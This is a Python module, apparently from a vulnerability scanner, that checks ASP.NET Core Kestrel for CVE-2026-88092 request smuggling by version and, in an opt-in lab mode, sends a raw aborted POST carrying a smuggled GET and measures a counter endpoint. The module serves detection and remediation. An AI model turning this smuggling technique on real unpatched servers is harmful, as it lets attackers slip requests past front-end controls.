from __future__ import annotations

import socket
import time
import urllib.parse
import urllib.request
from typing import Any

from ...core.args import aggressive_value
from ...core.http import normalize_url
from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-88092"
NAME = "ASP.NET Core Kestrel aborted-connection request smuggling"
RULE = "ASP.NET Core 8.0 before 8.0.32, 9.0 before 9.0.21, 10.0 before 10.0.13, and 11.0 before 11.0.0-rc2"
FIXED_RULE = "Upgrade ASP.NET Core to 8.0.32, 9.0.21, 10.0.13, 11.0.0-rc2, or newer"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if parse_version_required("8.0.0") <= parsed < parse_version_required("8.0.32"):
        return Status.LIKELY_VULNERABLE
    if parse_version_required("9.0.0") <= parsed < parse_version_required("9.0.21"):
        return Status.LIKELY_VULNERABLE
    if parse_version_required("10.0.0") <= parsed < parse_version_required("10.0.13"):
        return Status.LIKELY_VULNERABLE
    lowered = (version or "").lower()
    if lowered.startswith("11.0.0-preview") or lowered in {"11.0.0-rc.1", "11.0.0-rc1"}:
        return Status.LIKELY_VULNERABLE
    return Status.PATCHED


def _counter(url: str, timeout: float) -> int | None:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as response:
            return int(response.read(256).decode("utf-8", errors="replace").strip())
    except Exception:  # noqa: BLE001 - non-numeric or missing oracle
        return None


def _aborted_post(url: str, host_header: str, body: bytes, timeout: float) -> None:
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host_header.encode() + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    sock = socket.create_connection((host, port), timeout=timeout)
    try:
        sock.sendall(request)
        # Half-close so the server sees input completion while the body is unread.
        sock.shutdown(socket.SHUT_WR)
        sock.settimeout(timeout)
        try:
            while sock.recv(65535):
                pass
        except (TimeoutError, OSError):
            pass
    finally:
        sock.close()


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> Finding:
    """Aborted-connection differential against an inert request counter.

    Needs an application endpoint that increments a counter when a smuggled
    request is processed and a second endpoint that exposes the counter. The
    POST handler must not read the request body. These are private application
    details, so the probe is aggressive and lab-oriented.
    """
    base = normalize_url(target_url).rstrip("/")
    parsed = urllib.parse.urlparse(base)
    host_header = (
        aggressive_value(aggressive_args, aggressive_command, "host_header")
        or parsed.hostname
        or parsed.netloc
    )
    post_path = aggressive_value(aggressive_args, aggressive_command, "post_path", "/") or "/"
    smuggle_path = (
        aggressive_value(aggressive_args, aggressive_command, "smuggle_path", "/smuggled")
        or "/smuggled"
    )
    counter_path = (
        aggressive_value(aggressive_args, aggressive_command, "counter_path", "/hits") or "/hits"
    )
    settle_raw = aggressive_value(aggressive_args, aggressive_command, "settle", "0.8") or "0.8"
    try:
        settle = float(settle_raw)
    except (TypeError, ValueError):
        settle = 0.8

    counter_url = base + "/" + counter_path.lstrip("/")
    post_url = base + "/" + post_path.lstrip("/")
    inert = b"hello"
    smuggle = (
        f"GET {smuggle_path} HTTP/1.1\r\nHost: {host_header}\r\n\r\n".encode()
    )

    evidence: dict[str, Any] = {
        "post_path": post_path,
        "smuggle_path": smuggle_path,
        "counter_path": counter_path,
        "acknowledgement": "isolated lab only; requires an inert counter endpoint and a POST handler that does not read the body",
    }
    try:
        before_control = _counter(counter_url, timeout)
        _aborted_post(post_url, host_header, inert, timeout)
        time.sleep(settle)
        after_control = _counter(counter_url, timeout)
        before_trigger = _counter(counter_url, timeout)
        _aborted_post(post_url, host_header, smuggle, timeout)
        time.sleep(settle)
        after_trigger = _counter(counter_url, timeout)
    except Exception as exc:  # noqa: BLE001 - report transport failure, do not crash the scan
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="ASP.NET Core / Kestrel",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=counter_url,
            evidence={**evidence, "transport_error": str(exc)[:200]},
            detail="The aborted-connection probe could not complete.",
            action=FIXED_RULE,
            vulnerability_type="HTTP Request Smuggling",
        )

    control_delta = (
        after_control - before_control
        if before_control is not None and after_control is not None
        else None
    )
    trigger_delta = (
        after_trigger - before_trigger
        if before_trigger is not None and after_trigger is not None
        else None
    )
    evidence.update(
        {
            "counter_values": [before_control, after_control, before_trigger, after_trigger],
            "control_delta": control_delta,
            "trigger_delta": trigger_delta,
        }
    )
    if control_delta == 0 and trigger_delta is not None and trigger_delta >= 1:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="ASP.NET Core / Kestrel",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=counter_url,
            evidence=evidence,
            detail=(
                "An aborted POST whose unread body contained a smuggled request incremented an "
                "inert counter, while an inert control body did not. The smuggled request caused "
                "no state change beyond the counter."
            ),
            action=FIXED_RULE,
            vulnerability_type="HTTP Request Smuggling",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="ASP.NET Core / Kestrel",
        affected_rule=RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=counter_url,
        evidence=evidence,
        detail=(
            "The smuggled request did not produce a counter delta (or the control was not clean). "
            "This is consistent with keep-alive being disabled when the abort is recorded."
        ),
        action=FIXED_RULE,
        vulnerability_type="HTTP Request Smuggling",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aspnet_runtime: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del kwargs
    runtime = aspnet_runtime or {}
    if not runtime.get("detected"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_DETECTED,
            confidence=Confidence.MEDIUM,
            component="ASP.NET Core / Kestrel",
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            detail="ASP.NET Core / Kestrel was not detected on the target; no runtime version was evaluated.",
            action="No action is required unless the target is served by ASP.NET Core.",
            vulnerability_type="HTTP Request Smuggling",
        )
    version = runtime.get("version")
    status = classify_version(version)
    if status == Status.LIKELY_VULNERABLE:
        detail = (
            f"ASP.NET Core {version} is in the affected range. An aborted HTTP/1 connection "
            "can reparse unread request-body bytes as another request: the drain is skipped when "
            "the abort is recorded and the pre-fix loop keeps keep-alive on."
        )
        confidence = Confidence.HIGH
    elif status == Status.PATCHED:
        detail = f"ASP.NET Core {version} is at or beyond the fixed release."
        confidence = Confidence.HIGH
    else:
        detail = "ASP.NET Core was detected, but its exact runtime version is unknown."
        confidence = Confidence.MEDIUM
    if not run_exploit_check:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=status,
            confidence=confidence,
            component="ASP.NET Core / Kestrel",
            component_version=version,
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            detail=detail,
            action=FIXED_RULE,
            vulnerability_type="HTTP Request Smuggling",
        )
    if exploit_mode != "aggressive":
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=status,
            confidence=confidence,
            component="ASP.NET Core / Kestrel",
            component_version=version,
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            detail=detail + " This module supports only the isolated-lab aggressive aborted-connection probe.",
            action=FIXED_RULE,
            vulnerability_type="HTTP Request Smuggling",
        )
    if status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=status,
            confidence=confidence,
            component="ASP.NET Core / Kestrel",
            component_version=version,
            affected_rule=RULE,
            exploit_available=True,
            exploit_ran=False,
            detail=detail + " Active check skipped because the detected runtime is not affected.",
            action=FIXED_RULE,
            vulnerability_type="HTTP Request Smuggling",
        )
    probe = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )
    probe.component_version = version
    return probe


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "generic",
        "name": NAME,
        "component": "ASP.NET Core / Kestrel",
        "affected_rule": RULE,
        "affected_versions": [
            ">=8.0.0,<8.0.32",
            ">=9.0.0,<9.0.21",
            ">=10.0.0,<10.0.13",
            "11.0.0-preview.1..11.0.0-rc.1",
        ],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "vulnerability_type": "HTTP Request Smuggling",
        "module_version": "2.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": ["aspnet"],
        "references": [
            "https://github.com/dotnet/aspnetcore/security/advisories/GHSA-rv87-ccxw-8ggf",
            "https://github.com/dotnet/announcements/issues/472",
            "https://www.herodevs.com/blog-posts/kestrel-vulnerabilities-net-6-cve-2026-88092-cve-2026-70188",
            "https://www.cve.org/CVERecord?id=CVE-2026-88092",
        ],
    }
